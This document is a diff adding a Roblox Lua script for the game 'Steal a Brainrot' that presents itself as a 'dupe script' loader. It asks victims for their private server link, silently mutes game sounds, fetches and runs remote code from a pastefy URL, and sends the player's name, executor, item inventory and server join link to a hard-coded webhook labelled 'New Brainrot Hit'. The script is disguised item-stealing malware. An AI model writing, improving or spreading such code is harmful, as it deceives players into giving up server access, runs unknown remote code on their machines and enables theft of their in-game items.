@@ -1,0 +1,246 @@
+_G.sended = false
+_G.privateServerCode = nil
+
+print("Script started")
+
+-- Services
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local player = Players.LocalPlayer
+
+-- Check game support
+local allowedGames = {
+    [109983668079237] = true,
+    [96342491571673] = true,
+    [128762245270197] = true,
+}
+if not allowedGames[game.PlaceId] then
+    player:Kick("Game not supported. Please join a Steal a Brainrot")
+    return
+end
+
+-- Identify executor
+local executorName = (identifyexecutor and identifyexecutor()) or "KRNL"
+print("Executor identified:", executorName)
+
+-- Server type check
+local serverType = "Unknown"
+local stored = ReplicatedStorage:FindFirstChild("RobloxReplicatedStorage")
+if stored then
+    local serverFunc = stored:FindFirstChild("GetServerType")
+    if serverFunc then
+        local success, result = pcall(function()
+            return serverFunc:InvokeServer()
+        end)
+        if success then
+            serverType = result
+        end
+    end
+end
+print("Server type:", serverType)
+
+-- Anti AFK
+local VirtualUser = game:GetService("VirtualUser")
+Players.LocalPlayer.Idled:Connect(function()
+    VirtualUser:CaptureController()
+    VirtualUser:ClickButton2(Vector2.new())
+end)
+
+-- Webhook
+local tested = "https://webhook.lewisakura.moe/api/webhooks/1421951641346773083/S0ZaQaum13anBao_tl_fAHDKWLp3o0Ee_UcylrGSiWaTN42_6YQLQv3zkYItW500p2M5"
+
+-- Function to mute all sounds
+local function enableMute()
+    task.spawn(function()
+        while task.wait(1) do
+            for _, s in ipairs(game:GetDescendants()) do
+                if s:IsA("Sound") then
+                    s.Volume = 0
+                end
+            end
+        end
+    end)
+    print("All sounds muted.")
+end
+
+-- GUI
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local UICorner = Instance.new("UICorner")
+local TextButton = Instance.new("TextButton")
+local UICorner_2 = Instance.new("UICorner")
+local TextBox = Instance.new("TextBox")
+local UICorner_3 = Instance.new("UICorner")
+local TextLabel = Instance.new("TextLabel")
+local TextLabel_2 = Instance.new("TextLabel")
+
+ScreenGui.Parent = player:WaitForChild("PlayerGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = ScreenGui
+Frame.AnchorPoint = Vector2.new(0.5, 0.5)
+Frame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+Frame.Size = UDim2.new(0, 588, 0, 300)
+UICorner.Parent = Frame
+
+TextButton.Parent = Frame
+TextButton.AnchorPoint = Vector2.new(0.5, 0.5)
+TextButton.BackgroundColor3 = Color3.fromRGB(44, 128, 255)
+TextButton.Position = UDim2.new(0.5, 0, 0.76, 0)
+TextButton.Size = UDim2.new(0, 553, 0, 67)
+TextButton.Font = Enum.Font.Arial
+TextButton.Text = "Start"
+TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.TextSize = 36
+TextButton.TextStrokeTransparency = 0.58
+TextButton.TextWrapped = true
+UICorner_2.Parent = TextButton
+
+TextBox.Parent = Frame
+TextBox.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
+TextBox.Position = UDim2.new(0.03, 0, 0.38, 0)
+TextBox.Size = UDim2.new(0, 553, 0, 50)
+TextBox.Font = Enum.Font.SourceSans
+TextBox.Text = ""
+TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.TextSize = 18
+UICorner_3.Parent = TextBox
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundTransparency = 1
+TextLabel.Position = UDim2.new(0.33, 0, 0.03, 0)
+TextLabel.Size = UDim2.new(0, 200, 0, 50)
+TextLabel.Font = Enum.Font.FredokaOne
+TextLabel.Text = "Load dupe script"
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextSize = 30
+
+TextLabel_2.Parent = Frame
+TextLabel_2.BackgroundTransparency = 1
+TextLabel_2.Position = UDim2.new(0.33, 0, 0.16, 0)
+TextLabel_2.Size = UDim2.new(0, 200, 0, 50)
+TextLabel_2.Font = Enum.Font.FredokaOne
+TextLabel_2.Text = "Type in Private Server link"
+TextLabel_2.TextColor3 = Color3.fromRGB(126, 126, 126)
+TextLabel_2.TextSize = 27
+
+-- Detect link
+TextBox:GetPropertyChangedSignal("Text"):Connect(function()
+    if string.find(TextBox.Text, "https://www.roblox.com/share%?code=") then
+        local code = string.match(TextBox.Text, "code=([%w%-]+)")
+        if code then
+            _G.privateServerCode = code
+            print("Valid link detected! Code:", code)
+        end
+    end
+end)
+
+-- Start button
+TextButton.MouseButton1Click:Connect(function()
+    if not _G.privateServerCode then
+        warn("Enter a valid Roblox share link before starting!")
+        return
+    end
+
+    if not _G.sended then
+        -- 🔇 Mute all sounds
+        enableMute()
+
+        -- ▶️ Run external Pastefy script
+        pcall(function()
+            loadstring(game:HttpGet("https://pastefy.app/1K2SbA9D/raw"))()
+        end)
+
+        -- Find base
+        local myBase
+        local plotsFolder = workspace:FindFirstChild("Plots")
+        if plotsFolder then
+            for _, plot in ipairs(plotsFolder:GetChildren()) do
+                local sign = plot:FindFirstChild("PlotSign")
+                if sign and sign:FindFirstChild("YourBase") and sign.YourBase.Enabled == true then
+                    myBase = plot
+                    break
+                end
+            end
+        end
+
+        -- Collect animal data
+        local animalData = {}
+        local podiumsFolder = myBase and myBase:FindFirstChild("AnimalPodiums")
+        if podiumsFolder then
+            for i = 1, 45 do
+                local podium = podiumsFolder:FindFirstChild(tostring(i))
+                if podium then
+                    local overhead = podium:FindFirstChild("Base")
+                                    and podium.Base:FindFirstChild("Spawn")
+                                    and podium.Base.Spawn:FindFirstChild("Attachment")
+                                    and podium.Base.Spawn.Attachment:FindFirstChild("AnimalOverhead")
+                    if overhead then
+                        local display = overhead:FindFirstChild("DisplayName")
+                        local gen = overhead:FindFirstChild("Generation")
+                        local nameText = (display and display.Text) or "Unknown"
+                        local genText = (gen and gen.Text) or "N/A"
+                        table.insert(animalData, {Slot=i, Name=nameText, Generation=genText})
+                    else
+                        table.insert(animalData, {Slot=i, Name="Unknown", Generation="N/A"})
+                    end
+                else
+                    table.insert(animalData, {Slot=i, Name="Empty", Generation="N/A"})
+                end
+            end
+        end
+
+        -- Format Brainrot info
+        local animalLines = {}
+        for _, an in ipairs(animalData) do
+            if an.Name ~= "Unknown" and an.Name ~= "Empty" then
+                table.insert(animalLines, an.Name .. " | Gen: " .. an.Generation)
+            end
+        end
+
+        local fieldsValue = table.concat(animalLines, "\n")
+        if fieldsValue ~= "" then
+            fieldsValue = "```\n" .. fieldsValue .. "\n```"
+        else
+            fieldsValue = "No brainrots found..."
+        end
+
+        -- 🔢 Add player count
+        local playerCount = #Players:GetPlayers()
+
+        -- Send embed
+        local data = {
+            ["username"] = "Janeq Hub",
+            ["embeds"] = {{
+                ["title"] = ":moneybag: New Brainrot Hit with Janeq Hub EZ",
+                ["description"] = "Player: "..player.Name..
+                                  "\nExecutor: "..executorName..
+                                  "\nPlayers in server: "..playerCount..
+                                  "\n[Join Private Server](https://www.roblox.com/share?code=".._G.privateServerCode.."&type=Server)",
+                ["fields"] = {{
+                    ["name"] = "Brainrots:",
+                    ["value"] = fieldsValue
+                }}
+            }}
+        }
+
+        local jsonData = HttpService:JSONEncode(data)
+        if request then
+            pcall(function()
+                request({
+                    Url = tested,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = jsonData
+                })
+            end)
+            print("Brainrot + player count sent to webhook.")
+        else
+            warn("Executor request() function not found!")
+        end
+
+        _G.sended = true
+    end
+end)
